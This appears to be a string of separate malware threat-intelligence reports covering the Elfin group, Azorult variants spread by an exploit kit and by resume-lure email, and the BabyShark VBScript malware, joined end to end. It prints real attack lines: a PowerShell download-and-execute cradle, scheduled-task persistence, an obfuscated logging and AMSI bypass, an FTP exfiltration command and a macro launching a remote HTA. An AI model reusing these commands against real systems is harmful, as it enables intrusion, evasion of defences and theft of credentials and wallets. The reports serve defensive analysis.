backdoor written in the AutoIt scripting language.\\nIn addition to its custom malware, Elfin has also used a number of commodity malware tools, available for purchase on the cyber underground. These include:\\nRemcos (Backdoor.Remvio): A commodity remote administration tool (RAT) that can be used to steal information from an infected computer.\\nDarkComet (Backdoor.Breut): Another commodity RAT used to open a backdoor on an infected computer and steal information.\\nQuasar RAT (Trojan.Quasar): Commodity RAT that can be used to steal passwords and execute commands on an infected computer.\\nPupy RAT (Backdoor.Patpoopy): Commodity RAT that can open a backdoor on an infected computer.\\nNanoCore (Trojan.Nancrat): Commodity RAT used to open a backdoor on an infected computer and steal information.\\nNetWeird (Trojan.Netweird.B): A commodity Trojan which can open a backdoor and steal information from the compromised computer. It may also download additional potentially malicious files.\\nElfin also makes frequent use of a number of publicly available hacking tools, including:\\nLaZagne (SecurityRisk.LaZagne): A login/password retrieval tool\\nMimikatz (Hacktool.Mimikatz): Tool designed to steal credentials\\nGpppassword: Tool used to obtain and decrypt Group Policy Preferences (GPP) passwords\\nSniffPass (SniffPass): Tool designed to steal passwords by sniffing network traffic\\nCase study: How an Elfin attack unfolds\\nIn this section, we describe in detail an Elfin attack on a U.S. organization. On February 12, 2018 at 16:45 (all times are in the\\xa0organization’s local time), an email was sent to the organization advertising a job vacancy at an American global service provider. The email contained a malicious link to hxxp://mynetwork.ddnsDOT.net:880.\\nThe recipient clicked the link and proceeded to download and open a malicious HTML executable file, which in turn loaded content from a C&C server via an embedded iframe. At the same time, code embedded within this file also executed a PowerShell command to download and execute a copy of chfeeds.vbe from the C&C server.\\nSystem.Net.ServicePointManager::ServerCertificateValidationCallback={$true};IEX(New-Object Net.WebClient).DownloadString(\\'hxxps://217.147.168DOT46:8088/index.jpg\\');\\nA second JavaScript command was also executed, which created a scheduled task to execute chfeeds.vbe multiple times a day.\\na.run(\\'%windir%\\\\\\\\System32\\\\\\\\cmd.exe /c PowerShell -window hidden schtasks.exe /CREATE /SC DAILY /TN \"1\" /TR \"C:\\\\\\\\Users\\\\\\\\%username%\\\\\\\\AppData\\\\\\\\Local\\\\\\\\Microsoft\\\\\\\\Feeds\\\\\\\\chfeeds.vbe\" /ST 01:00 /f && schtasks.exe /CREATE /SC DAILY /TN \"3\" /TR \"C:\\\\\\\\Users\\\\\\\\%username%\\\\\\\\AppData\\\\\\\\Local\\\\\\\\Microsoft\\\\\\\\Feeds\\\\\\\\chfeeds.vbe\" /ST 03:00 /f && schtasks.exe /CREATE /SC DAILY /TN \"5\" /TR \"C:\\\\\\\\Users\\\\\\\\%username%\\\\\\\\AppData\\\\\\\\Local\\\\\\\\Microsoft\\\\\\\\Feeds\\\\\\\\chfeeds.vbe\" /ST 05:00 /f && schtasks.exe /CREATE /SC DAILY /TN \"7\" /TR \"C:\\\\\\\\Users\\\\\\\\%username%\\\\\\\\AppData\\\\\\\\Local\\\\\\\\Microsoft\\\\\\\\Feeds\\\\\\\\chfeeds.vbe\" /ST 07:00 /f && schtasks.exe /CREATE /SC DAILY /TN \"9\" /TR \"C:\\\\\\\\Users\\\\\\\\%username%\\\\\\\\AppData\\\\\\\\Local\\\\\\\\Microsoft\\\\\\\\Feeds\\\\\\\\chfeeds.vbe\" /ST 09:00 /f && schtasks.exe /CREATE /SC DAILY /TN \"11\" /TR \"C:\\\\\\\\Users\\\\\\\\%username%\\\\\\\\AppData\\\\\\\\Local\\\\\\\\Microsoft\\\\\\\\Feeds\\\\\\\\chfeeds.vbe\" /ST 11:00 /f && schtasks.exe /CREATE /SC DAILY /TN \"13\" /TR \"C:\\\\\\\\Users\\\\\\\\%username%\\\\\\\\AppData\\\\\\\\Local\\\\\\\\Microsoft\\\\\\\\Feeds\\\\\\\\chfeeds.vbe\" /ST 13:00 /f && schtasks.exe /CREATE /SC DAILY /TN \"15\" /TR \"C:\\\\\\\\Users\\\\\\\\%username%\\\\\\\\AppData\\\\\\\\Local\\\\\\\\Microsoft\\\\\\\\Feeds\\\\\\\\chfeeds.vbe\" /ST 15:00 /f && schtasks.exe /CREATE /SC DAILY /TN \"17\" /TR \"C:\\\\\\\\Users\\\\\\\\%username%\\\\\\\\AppData\\\\\\\\Local\\\\\\\\Microsoft\\\\\\\\Feeds\\\\\\\\chfeeds.vbe\" /ST 17:00 /f && schtasks.exe /CREATE /SC DAILY /TN \"19\" /TR \"C:\\\\\\\\Users\\\\\\\\%username%\\\\\\\\AppData\\\\\\\\Local\\\\\\\\Microsoft\\\\\\\\Feeds\\\\\\\\chfeeds.vbe\" /ST 19:00 /f && schtasks.exe /CREATE /SC DAILY /TN \"21\" /TR \"C:\\\\\\\\Users\\\\\\\\%username%\\\\\\\\AppData\\\\\\\\Local\\\\\\\\Microsoft\\\\\\\\Feeds\\\\\\\\chfeeds.vbe\" /ST 21:00 /f && schtasks.exe /CREATE /SC DAILY /TN \"23\" /TR \"C:\\\\\\\\Users\\\\\\\\%username%\\\\\\\\AppData\\\\\\\\Local\\\\\\\\Microsoft\\\\\\\\Feeds\\\\\\\\chfeeds.vbe\" /ST 23:00 /f \\')\\nThe chfeeds.vbe file acts as a downloader and was used to download a second PowerShell script (registry.ps1).\\xa0This script in turn downloaded and executed a PowerShell backdoor known as POSHC2, a proxy-aware C&C framework, from the C&C server (hxxps:// host-manager.hopto.org). Later at 20:57, the attackers became active on the compromised machine and proceeded to download the archiving tool WinRAR.\\n89.34.237.118\\xa0\\xa0\\xa0808\\xa0\\xa0\\xa0hxxp://89.34.237DOT118:808/Rar32.exe\\nAt 23:29, the attackers then proceeded to deploy an updated version of their POSHC2 stager.\\n192.119.15.35\\xa0\\xa0\\xa0880\\xa0\\xa0\\xa0hxxp://mynetwork.ddnsDOTnet:880/st-36-p4578.ps1\\nThis tool was downloaded several times between 23:29 on February 12 and 07:47 on February 13.\\nTwo days later, on February 14 at 15:12, the attackers returned and installed Quasar RAT onto the infected computer that communicated with a C&C server (217.147.168.123). Quasar RAT was installed to CSIDL_PROFILE\\\\appdata\\\\roaming\\\\microsoft\\\\crypto\\\\smss.exe.\\nAt this point, the attackers ceased activity while maintaining access to the network until February 21. At 06:38, the attackers were observed downloading a custom .NET FTP tool to the infected computer.\\n192.119.15.36\\xa0\\xa0\\xa0880\\xa0\\xa0\\xa0hxxp://192.119.15DOT36:880/ftp.exe\\nLater at 6:56, the attackers exfiltrated data using this FTP tool to a remote host:\\nJsuObf.exe Nup#Tntcommand -s CSIDL_PROFILE\\\\appdata\\\\roaming\\\\adobe\\\\rar -a ftp://89.34.237.118:2020 -f /REDACTED -u REDACTED -p REDACTED\\nActivity ceased until the attackers returned on March 5 and were observed using Quasar RAT to download a second custom AutoIt FTP exfiltration tool known as FastUploader from hxxp://192.119.15DOT36:880/ftp.exe.\\xa0This tool was then installed to csidl_profile\\\\appdata\\\\roaming\\\\adobe\\\\ftp.exe. FastUploader is a custom FTP tool designed to exfiltrate data at a faster rate than traditional FTP clients.\\nAt this point, additional activity from the attackers continued between March 5 into April, and on April 18 at 11:50, a second remote access tool known as DarkComet was deployed to csidl_profile\\\\appdata\\\\roaming\\\\microsoft\\\\windows\\\\start menu\\\\programs\\\\startup\\\\smss.exe on the infected computer. This was quickly followed 15 seconds later by the installation of a credential dumping to csidl_profile\\\\appdata\\\\roaming\\\\microsoft\\\\credentials\\\\dwm32.exe, and the execution of PowerShell commands via PowerShell Empire, a freely available post-exploitation framework, to bypass logging on the infected machine.\\n$GPF=Ref.AsSeMBLy.GeTTYPe(\\'System.Management.Automation.Utils\\').\"GEtFiE`LD\"(\\'cachedGroupPolicySettings\\',\\'N\\'+\\'onPublic,Static\\');If($GPF){$GPC=$GPF.GeTVALUE($NUlL);If($GPC\\'ScriptB\\'+\\'lockLogging\\'){$GPC\\'ScriptB\\'+\\'lockLogging\\'\\'EnableScriptB\\'+\\'lockLogging\\'=0;$GPC\\'ScriptB\\'+\\'lockLogging\\'\\'EnableScriptBlockInvocationLogging\\'=0}$vAL=COlLecTIons.GEneRic.DIctIoNARystRiNG,SyStEM.Object::nEw();$VAL.ADD(\\'EnableScriptB\\'+\\'lockLogging\\',0);$VaL.Add\\n(\\'EnableScriptBlockInvocationLogging\\',0);$GPC\\n\\'HKEY_LOCAL_MACHINE\\\\Software\\\\Policies\\\\Microsoft\\\\Windows\\\\PowerShell\\\\ScriptB\\'+\\'lockLogging\\'=$VaL}ELSe{SCRIPTBLOck.\"GEtFiE`Ld\"(\\'signatures\\',\\'N\\'+\\'onPublic,Static\\').SETVAlue($NuLL,(New-ObjeCt ColLectiONs.GeNERic.HASHSEtStrInG))}REF.AssemBLy.GetTyPE(\\'System.Management.Automation.AmsiUtils\\')|?{$_}|%{$_.GEtFielD(\\'amsiInitFailed\\',\\'NonPublic,Static\\').SETValUe($nUll,$TrUE)};\\nActivity continued throughout April where additional versions of DarkComet, POSHC2 implants, and an AutoIt backdoor were deployed along with further credential dumping activities.\\nActive and agile attacker\\nElfin is one of the most active groups currently operating in the Middle East, targeting a large number of organizations across a diverse range of sectors.

      "\"New Wine in Old Bottle: New Azorult Variant Found in FindMyName Campaign using Fallout Exploit Kit\\nMenu\\nTools\\nPlaybooks\\nSpeaking Events\\nAbout Us\\nNew Wine in Old Bottle: New Azorult Variant Found in FindMyName Campaign using Fallout Exploit Kit\\n14,928\\npeople reacted\\n1\\n10\\nmin. read\\nShare\\nBy Tao Yan, Xingyu Jin, Bo Qu and Zhanglin He\\nNovember 21, 2018 at 6:00 AM\\nCategory: Unit 42\\nTags: Azorult, Coins, Cryptocurrency, CVE-2018-8174, Electrum, Electrum-LTC, Ethereum, Exodus, Fallout Exploit Kit, FindMyName, Jaxx, MultiBitHD, Wallet\\nThis post is also available in:\\n日本語 (Japanese)Overview\\nObserved in the wild as early as 2016, Azorult is a Trojan family which has been delivered in malicious macro-based documents via spam campaigns, or as a secondary payload in the RIG Exploit Kit campaigns.\\xa0 On October 20th, 2018 we discovered that new Azorult variants were being used as primary payloads in a new ongoing campaign using the Fallout Exploit Kit. We named this campaign ‘FindMyName’ because all of the final exploit pages land on the domain findmyname.pw. These new Azorult samples variants use advanced obfuscation techniques, such as API flooding and control flow flattening, to evade anti-virus products.\\xa0 Also, we discovered that Azorult has further evolved, the samples we captured support stealing sensitive information in more browsers, applications, and cryptocurrency wallets than previous versions.\\nIn this blog we will cover the FindMyName campaign, the new Azorult malware, and the obfuscation techniques used.\\nFirst stage of FindMyName Campaign\\nOctober 20th is when we first observed the new campaign we are dubbing FindMyName. In the following 3 days, 5 different URL chains, listed in appendix 1, led to the delivery of the Fallout Exploit Kit. All 5 different URL chains redirected victims to one domain, findmyname.pw.\\nThe steps in the first stage of FindMyName campaign are shown in Figure 1.\\nFigure 1 Overview of the first stage of the attack\\nAlthough the 5 final pages in findmyname.pw were different, the content of them were similar. An example of the Fallout Exploit Kit landing page is shown in Figure 2.\\nFigure 2 obfuscated landing page\\nThe Fallout Exploit Kit uses several html tags such as span, h3, and p to hide the real exploit code with highly obfuscated tag content. After decryption, the real VBScript code exploits an IE VBScript vulnerability CVE-2018-8174 which was patched in August.\\nFigure 3 Exploit code snippet of CVE-2018-8174 in Fallout Exploit Kit\\nAfter the exploit succeeds, this Fallout Exploit Kit downloads a “.tmp” file to the %Temp% directory and calls CreateProcess to execute it. Further analysis revealed that the “.tmp” file was the latest variant of Azorult malware. It was the first time we’ve seen the new variant of Azorult malware used as primary payload for Fallout Exploit Kit.\\nSecond stage of FindMyName Campaign\\nIn this section, we focus on analyzing the latest variant of Azorult malware we captured.\\nMalware Analysis Overview\\nThe Azorult malware family is a commercial Trojan sold on underground forums. We observed 3 new variants of Azorult malware in the recent FindMyName campaign. When we discovered them, 2 of the 3 samples had not been seen in the wild yet. One of the new Azorult samples we captured and analyzed has the following malicious features (some of these features are explained in detail in the next section):\\nEvades anti-virus emulator through API flooding.\\nThwarts reverse engineering analysis through a control flow flattening technique.\\nUses a process hollowing technique to build the new malware image.\\nSteals credentials, cookies, histories and autofills for more browsers than previous versions.\\nSteals more cryptocurrency wallets than previous versions.\\nSteals skype, telegram, steam, FTP client, Email client credentials and chat history when applicable.\\nHarvests victim’s information via installed programs, screenshots, machine information, user name, OS version and running processes.\\nCollects files from the user’s Desktop.\\nAnti-forensic component, cleans up all dropped files.\\nExecutes specific file(s) initiated by C2 communication.\\nAPI Flooding and Control Flow Flattening Obfuscation\\nThe initial Azorult malware was written in Microsoft Visual C++ 7.0. First, the Azorult malware attempted to use control flow flattening obfuscation to thwart reverse engineering analysis as shown in Figure 4. Second, the sample used an API Flooding technique as shown in Figure 5. API Flooding is a malware technique to evade anti-virus emulators. For timely performance concerns, anti-virus emulators set a timer when emulating the executable file on the host machine. If the emulator emulates hundreds of time consuming functions, the emulator times out and marks the file as benign.\\nFigure 4 control flow flatten\\nFigure 5 API flooding\\nProcess Hollowing\\nAzorult uses a process hollowing technique to build the new malware image. First, the sample decrypts the payload in the memory. Then the sample creates a new suspended process of itself. The sample then injects a decrypted payload to the new process. Lastly, the sample resumes new process execution and\\xa0exhibits malicious behaviors. The overview of the sample execution is shown in Figure 6.\\nFigure 6 Sample process hollowing\\nC2 Communication\\nThe new trojan file dumped from the process was coded in the Delphi language. When the sample executes, it immediately connects to a C2 server for further instructions. In order to evade Intrusion Prevention Systems (IPS), the C2 traffic is obfuscated. The data sent back to the C2 includes a unique victim ID for each victim’s machine by encoding the machine GUID , Windows product name, user name and computer name with hash algorithm. \\xa0Then the malware decrypts a C2 address and sends a POST request to 51.15.196.30/1/index.php with the encrypted victim’s ID. The C2 traffic is shown in Figure 7. The detailed example about hash algorithm and encryption is listed in Appendix 1.\\nFigure 7 C2 request\\nThe sample decrypts and validates the C2 response. The decrypted C2 content had three parts. The part contained inside the <n></n> tags \\xa0contains 48 legit DLLs which are used for information stealing, described in the following sections. The part inside the <d></d> tags contains application information for information stealing: application path, related registry and credential file names. The part in the <c></c> tags contains a C2 configuration for the sample. The C2 configuration is shown in Figure 8. According to pcap analysis, we identified the following characters checked by this sample.\\n“+”: enabling the specific malicious function.\\n“-”: disabling the specific malicious function.\\n“I”: collecting host IP info.\\n“L”: downloading and executing file from remote server.\\nFigure 8 C2 configuration\\nMalicious functions specified by C2:\\nSteal browser password credentials.\\nSteal browser cookies, autofill credentials. Steal credentials from FTP client or Email client.\\nSteal browser history.\\nSteal bitcoin wallets.\\nSteal skype chat message main.db.\\nSteal telegram credentials.\\nSteal steam credentials (ssfn) and game metadata (.vdf).\\nTakes a screenshot that eventually is sent to the attacker.\\nClean-up the temporary malware files.\\nCollect files from Desktop.\\nGet host IP information by sending GET request to ip-api.com/json.\\nDownload and execute file specified by C2.\\nFigure 9 shows an example of C2 configuration for stealing sensitive information from Firefox and Thunderbird.\\nFigure 9 C2 configuration for information stealing\\nThe overview of C2 traffic is shown in Figure 10.\\nFigure 10 C2 traffic overview\\nInformation stealer\\nThe sample stole credentials and user data from thirty-two browsers including Chrome, Firefox and Qihoo 360. The full list of browsers is in Appendix 2. To steal credentials from browsers, the sample downloaded 48 legitimate dll files from C2 response to %AppData%\\\\Local\\\\Temp\\\\2fda folder as shown in Figure 11.\\nFigure 11 legit dll files\\nThe purpose of this action is to load nss3.dll and load the following functions:\\nsqlite3_open\\nsqlite3_close\\nsqlite3_prepare_v2\\nsqlite3_step\\nsqlite3_column_text\\nsqlite3_finalize\\nNSS_Init\\nPK11_GetInternalKeySlot\\nPK11_Authenticate\\nPK11SDR_Decrypt\\nNSS_Shutdown\\nPK11_FreeSlot\\nThese functions are used to dump sensitive browser information. For example, the malware tried to use sqlite3_* functions to get the Firefox browser history information as shown in figure 12.\\nFigure 12 steal Firefox sensitive information using APIs in nss3.dll\\nHere is another example of a user name and password being stolen, this time from saved Chrome data. The sample searched the path “%LOCALAPPDATA%\\\\Google\\\\Chrome\\\\User Data\\\\” for file “Login Data”. If found, the sample copies the “Login Data” file to the %AppData%\\\\Local\\\\Temp directory and called sqlite3_prepare_v2 function from nss3.dll to exfiltrate credentials with SQL query: “SELECT origin_url, username_value, password_value FROM logins” as shown in Figure 13.\\nFigure 13 select strings for stealing browser credentials\\nThe malware also withdrawals cookies, bookmarks, and autofill information from the aforementioned browsers. Credential information is saved to PasswordsList.txt and cookies are saved to CookieList.txt.\\nAdditionally, the sample steals the following cryptocurrency wallets:\\nEthereum\\nElectrum\\nElectrum-LTC\\nJaxx\\nExodus\\nMultiBitHD\\nTh malware tries to find the specified file including sensitive information of cryptocurrency wallets. For example the sample tried to find and send “mbhd.wallet.aes” file located in “Coins\\\\MultiBitHD” as shown in Figure 14.\\nFigure 14 steal cryptocurrency wallets\\nThe \\xa0sample steals credentials and user data from popular applications including Thunderbird, FileZilla, Outlook, WinSCP, Skype, Telegram and Steam. It also steals files from the Desktop. For example, the sample tries to find “D877F783D5*.map*” file under “%appdata%\\\\Telegram Desktop\\\\tdata” directory to steal sensitive information from Telegram as shown in Figure 15.\\nFigure 15 steal applications credentials\\nThe sample collects the user information including current processes, installed software, system language and time zone. The harvested credentials and user information are then sent back to the C2. Here are some highlights about system information stealing.\\nThe malware captures a screenshot of the victim’s computer and saves it to an image file named scr.jpg as shown in Figure 16.\\nFigure 16 capture screen\\nMalware uploads files from path and driver type specified by C2 response.\\nAcquires host IP information by sending GET request to ip-api.com/json. It stores json response in ip.txt.\\nCollects the following user information and saves it to system.txt.\\nMachine GUID.\\nWindows Product Name.\\nUser Name.\\nComputer Name.\\nSystem Architecture.\\nScreen height and width.\\nSystem language.\\nCurrent local time.\\nTime zone.\\nNumber of CPU cores.\\nCurrent process lists by calling CreateToolhelp32Snapshot.\\nDisplay version and name.\\nInstalled software. (Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall\\\\).\\nGet current account privilege.\\nAll information gathered by the malware is shown in figure 17.\\nFigure 17 information gathered by malware\\nExecute File Specified by Malware\\nThe attacker can remotely control the infected system to execute any file through Create Process or ShellExecute as shown in Figure 18. We also observed that it had the behavior of accessing a malicious URL to get the file: plugin-update.space/download/10.17.18.exe.\\nFigure 18 call CreateProcess or ShellExecute to execute the file\\nThis new variant of Azorult also has the capability to execute malware with local system privileges. It will check the current SID and token by following logic as shown in Figure 19:\\nIf the current integrity level is local_system\\nIt will call WTSQueryUserToken and CreateProcessAsUser to start a new process with system privilege as shown in Figure 20.\\nFigure 19 Check SID and token\\nFigure 20 create process as local system privilege\\nErasing Hints and Deleting Files\\nWe also found that the malware erases all of the files located in “%temp%\\\\2fda” and deletes files according to the C2’s command as shown in Figure 21 and Figure 22.\\nFigure 21 Erasing Hints of Infection\\nFigure 22 delete files according C2 command\\nConclusion\\nA presumed new campaign surfaced in late October that caught our attention. In the span of 3 days, 5 Fallout Exploit Kit URL chains were observed, all landing on an exploit page hosted on domain findmyname.pw. There is a new variant of Azorult malware found to be used as a payload for Fallout Exploit Kit. It has updated features compared to the previous versions and supports stealing from more software and cryptocurrency wallets than ever before.\\nOrganizations with up-to-date Windows hosts have a much lower risk of infection. Palo Alto Networks’ customers are further protected from this threat. Our threat prevention platform detects both Fallout exploit kit and Azorult malware. AutoFocus users can track this activity using the AzoRult tag.\\nIOCs\\nURL Chains\\nURL chain

We have since observed many instances of AZORult dropped via exploit kits and in fairly regular email campaigns as both a primary and secondary payload.\\nRecently, AZORult authors released a substantially updated version, improving both on its stealer and downloader functionality. It is noteworthy that within a day of the new update appearing on underground forums, a prolific actor used the new version in a large email campaign, leveraging its new capabilities to distribute Hermes ransomware. It is always interesting to see malware campaigns where both a stealer and ransomware are present, as this is less common 1, and especially disruptive for recipients who initially may have credentials, cryptocurrency wallets, and more stolen before losing access to their files in a subsequent ransomware attack.\\nAZORult Forum Advertisement\\nOn July 17, a major update to the AZORult credential stealer and downloader was advertised on an underground forum. The change log for the new version -- Version 3.2 -- is shown below. The conditional loader feature, based on the presence of cookies, cryptocurrency wallets, and other parameters, is particularly noteworthy.\\n**************\\nChange log text:\\nUPD v3.2\\n+ Added stealing of history from browsers (except IE and Edge)\\n+ Added support for cryptocurrency wallets: Exodus, Jaxx, Mist, Ethereum, Electrum, Electrum-LTC\\n+ Improved loader. Now supports unlimited links. In the admin panel, you can specify the rules for how the loader works. For example: if there are cookies or saved passwords from mysite.com, then download and run the file link.com/soft.exe. Also there is a rule \"If there is data from cryptocurrency wallets\" or \"for all\"\\n+ Stealer can now use system proxies. If a proxy is installed on the system, but there is no connection through it, the stealer will try to connect directly (just in case)\\n+ Reduced the load in the admin panel.\\n+ Added to the admin panel a button for removing \"dummies\", i.e. reports without useful information\\n+ Added to the admin panel guest statistics\\n+ Added to the admin panel a geobase\\n**************\\nCampaign Analysis\\nOn July 18, 2018, one day after the AZORult update above was announced, we observed a campaign delivering thousands of messages targeting North America that used the new version of AZORult. The messages used employment-related subjects such as “About a role” and “Job Application”. The attached documents used file names in the format of “firstname.surname_resume.doc”.\\nFigure 1: Email used in the July 18 campaign\\nThe documents in this campaign were password-protected. The password was included in the body of the original email and, in this case, was ‘789’, as visible in Figure 1 above. This technique is an attempt to evade various antivirus engines, since the document itself is not malicious until the password is entered successfully. Once potential victims enter the password, they also need to enable macros for the document to download AZORult, which in turn downloads the Hermes 2.1 ransomware payload.\\nFigure 2: Document attachment used in the July 18 campaign\\nWe attribute this campaign to an actor we track as TA516. In 2017 we presented research on TA516 and ways in which this actor used documents with similar resume lures to download banking Trojans or a Monero miner. Improved means of stealing cryptocurrency wallets and credentials in the new version of AZORult might also provide a connection to TA516’s demonstrated interests in cryptocurrencies.\\nMalware Analysis\\nOnce the recipient opens the password-protected document and enables the embedded macros, the macros download AZORult. While there were many code changes to the malware, we focused on analyzing the updated command and control (C&C) communication protocol.\\nThe following POST is an initial client-to-server communication, where the client sends an initial checkin request and the server responds with data XOR-encoded with a 3-byte key (The XOR key in this case was \\\\x0d0ac8). If we decode this data, the server response begins with a base64-encoded configuration block.\\nFigure 3: Initial client beacon followed by the encoded server response\\nFigure 4: Initial client beacon followed by the server response (decoded by us manually)\\nAs Figure 4 shows, there is a base64 string (configuration block) included in the server response between the “<c>” and “</c>” tags. It decodes to the following, revealing cryptocurrency strings of interest:\\n++++-+++++\\nF\\xa0\\xa0\\xa0\\xa0\\xa0 123\\xa0\\xa0\\xa0 %DSK_23% *wallet*.txt,*seed*.txt,*btc*.txt,,*key*.txt,*2fa*.txt,*2fa*.png,*2fa*.jpg,*auth*.jpg,*auth*.png,*crypto*.txt,*coin*.txt,*poloniex*,*kraken*,*okex*,*binance*,*bitfinex*,*gdax*,*private*.txt,*upbit,**bcex*,*bithimb*,*hitbtc*,*bitflyer*,*kucoin*,*huobi*,*wallet.json*\\xa0\\xa0\\xa0\\xa0\\xa0\\xa0 10\\xa0\\xa0\\xa0\\xa0 +\\xa0\\xa0\\xa0\\xa0\\xa0 -\\nI\\xa0\\xa0\\xa0\\xa0\\xa0 <REMOVED, IP ADDRESS OF THE INFECTED CLIENT>:<COUNTRY OF THE INFECTED CLIENT>\\nWe can also see another encoded block after the base64 string\\xa0 (only the beginning of the block is shown for brevity). This is yet another XOR-encoded data block, where the key is 4 bytes. Decoding this second encoded data block reveals additional configuration information and executable files such as mozglue.dll, nssdbm3.dll, softokn3.dll, ucrtbase.dll, or vcruntime140.dll. While the purpose of these executables is not known, we do not see any reason to send these other than to perhaps delay reverse engineering and analysis.\\nNext, after the initial exchange between the infected machine and the C&C server, the infected machine sends a report containing the stolen information. Again the report is XOR-encoded with the same 3-byte key; a portion of\\xa0 the decoded version is shown in Figure 5. The stolen information is organized into sections:\\ninfo: basic computer information such as Windows version and computer name\\npwds: this section contains stolen passwords (not confirmed)\\ncoks: cookies or visited sites\\nfile: contents of the cookies files and a file containing more system profiling information including machine ID, Windows version, computer name, screen resolution, local time, time zone, CPU model,\\xa0 CPU count,\\xa0 RAM, video card information, process listing of the infected machine, and software installed on the infected machine.\\nFigure 5: A report of stolen information sent by the infected machine (only a snippet is shown here)\\nFinally, after the initial beaconing, receiving a configuration, and exfiltrating stolen information from the infected machine, AZORult may download the next payload. For example, in the campaign described at the beginning of this post, AZORult downloads Hermes 2.1 ransomware\\xa0 after it exfiltrates the victim’s data and credentials.\\nConclusion\\nAs in legitimate software development, malware authors regularly update their software to introduce competitive new features, improve usability, and otherwise differentiate their products. The recent update to AZORult includes substantial upgrades to malware that was already well-established in both the email and web-based threat landscapes. It is noteworthy that within a day of the new update appearing on underground forums, a prolific actor used the new version in a large email campaign, leveraging its new capabilities to distribute Hermes ransomware.\\nThe potential impact of this type of attack is considerable:\\nThe campaigns sent thousands of messages\\nAZORult malware, with its capabilities for credential and cryptocurrency theft, brings\\xa0 potential direct financial losses for individuals as well as the opportunity for actors to establish a beachhead in affected organizations\\nAdditional direct financial losses and business disruption via infection with Hermes ransomware.\\nReferences\\n1 https://www.malware-traffic-analysis.net/2017/01/27/index2.html\\n2 https://malware.dontneedcoffee.com/2018/03/CVE-2018-4878.html#gf-sundown\\n3 https://www.proofpoint.com/us/threat-insight/post/threat-actors-using-legitimate-paypal-accounts-distribute-chthonic-banking\\nIndicators of Compromise (IOCs)\\nIOC\\nIOC Type\\nDescription\\nccf1f4d83023c51a75ba008cbd25167c2a1e55f6a8617fe004b63dcd4acc0de4\\nSHA-256\\nMalicious document\\nhxxp://205.185.121.209/azo.exe\\nURL\\nDocument payload (AZORult)\\n3809394dceddbe1419e964cd08397e5fed4a0bbefc8be466f33614bac8794243\\nSHA-256\\nAZORult\\nhxxp://briancobert.com/index.php\\nURL\\nAZORult C&C\\nhxxp://205.185.121.209/5.exe\\nURL\\nAZORult payload (Hermes)\\n6071511eea15d5b1d9d8bf9803ad71b3fe65c455b77d683a3aaf887fa54cb447\\nSHA-256\\nHermes\\nET and ETPRO Suricata/Snort/ClamAV Signatures\\n2025885 || ET TROJAN AZORult Variant.4 Checkin\\nAbout\\nOverview\\nWhy Proofpoint\\nCareers\\nLeadership Team\\nNews Center\\nInvestors Center\\nThreat Center\\nLatest Threat Report\\nHuman Factor Report\\nThreat Glossary\\nThreat Blog\\nDaily Ruleset\\nProducts\\nEmail Protection\\nAdvanced Threat Protection\\nSecurity Awareness Training\\nCloud App Security\\nArchive & Compliance\\nInformation Protection\\nDigital Risk Protection\\nProduct Bundles\\nNexus Platform\\nResources\\nWhitepapers\\nWebinars\\nDatasheets\\nEvents\\nCustomer Stories\\nBlog\\nFree Trial\\nConnect\\n+1-408-517-4710\\nContact Us\\nOffice Locations\\nRequest a Demo\\nSupport\\nSupport Login\\nSupport Services\\nIP Address Blocked?\\nSocial ListFacebook\\nTwitter\\nlinkedin\\nYoutube\\nRegions\\nUnited States\\nUnited Kingdom\\nFrance\\nGermany\\nItaly\\nSpain\\nJapan\\nAustralia\\n© 2020.

The spear phishing emails were written to appear as though they were sent from a nuclear security expert who currently works as a consultant for in the U.S. The emails were sent using a public email address with the expert’s name and had a subject referencing North Korea’s nuclear issues. The emails had a malicious Excel macro document attached, which when executed led to a new Microsoft Visual Basic (VB) script-based malware family which we are dubbing “BabyShark”.\\nBabyShark is a relatively new malware. The earliest sample we found from open source repositories and our internal data sets was seen in November 2018. The malware is launched by executing the first stage HTA from a remote location, thus it can be delivered via different file types including PE files as well as malicious documents. It exfiltrates system information to C2 server, maintains persistence on the system, and waits for further instruction from the operator. Figure 1, below, shows the flow of execution.\\nFigure 1 BabyShark execution flow\\nUnit 42 was able to determine the phishing emails targeted at least:\\nA university in the U.S. which was to hold a conference about North Korea denuclearization issue at the time\\nA research institute based in the U.S. which serves as a think tank for national security issues, and where the previously referenced nuclear expert currently works.\\nExpanding our search to public repository samples, we identified additional malicious document samples delivering BabyShark. The original file names and decoy contents of these samples suggested that the threat actor might have interests in gathering intelligence related to not only North Korea, but possibly wider in the Northeast Asia region.\\nDuring the investigation, we were able to find links to other suspected North Korean activities in the past; KimJongRAT and STOLEN PENCIL.\\nMalicious Documents\\nBabyShark is a relatively new malware. The first sample we observed is from November 2018. The decoy contents of all malicious documents delivering BabyShark were written in English and were related to Northeast Asia’s regional security issues.\\nFigure 2 Timeline of BabyShark malicious documents and filename / decoys\\nWhile some decoys used content which is publicly available information on the internet, some used content which appears to not be public. Inspecting the metadata of the documents with this non-public content, we suspect that the threat actor likely compromised someone with access to private documents at a\\xa0U.S. national security think tank.\\nFigure 3 Decoy content copied from the internet\\nFigure 4 Decoy content not publicly available on the internet (intentionally obfuscated)\\nThe malicious documents contain a simple macro which would load the BabyShark’s first stage HTA at a remote location.\\nSub AutoOpen()\\nShell (“mshta https://tdalpacafarm.com/files/kr/contents/Vkggy0.hta”)\\nEnd Sub\\nBabyShark Malware Analysis\\nAnalyzed sample details:\\nSHA256\\n9d842c9c269345cd3b2a9ce7d338a03ffbf3765661f1ee6d5e178f40d409c3f8\\nCreate Date\\n2018:12:31 02:40:00Z\\nModify Date\\n2019:01:10 06:54:00Z\\nFilename\\nOct_Bld_full_view.docm\\nTable 1 Analyzed sample details\\nThe sample is a Word document which contains a malicious macro loading BabyShark by executing the first stage HTA file at a remote location below:\\nhttps://tdalpacafarm.com/files/kr/contents/Vkggy0.hta\\nAfter successfully loading the first stage HTA, it sends out an HTTP GET request to another location on the same C2 server, then decodes the response content with the following decoder function.\\nFunction Co00(c)\\nL=Len(c)\\ns=””\\nFor jx=0 To d-1\\nFor ix=0 To Int(L/d)-1\\ns=s&Mid(c,ix*d+jx+1,1)\\nNext\\nNext\\ns=s&Right(c,L-Int(L/d)*d)\\nCo00=s\\nEnd Function\\nThe decoded BabyShark VB script first enables all future macros for Microsoft Word and Excel by adding the following registry keys:\\nHKCU\\\\Software\\\\Microsoft\\\\Office\\\\14.0\\\\Excel\\\\Security\\\\VBAWarnings, value:1\\nHKCU\\\\Software\\\\Microsoft\\\\Office\\\\15.0\\\\Excel\\\\Security\\\\VBAWarnings, 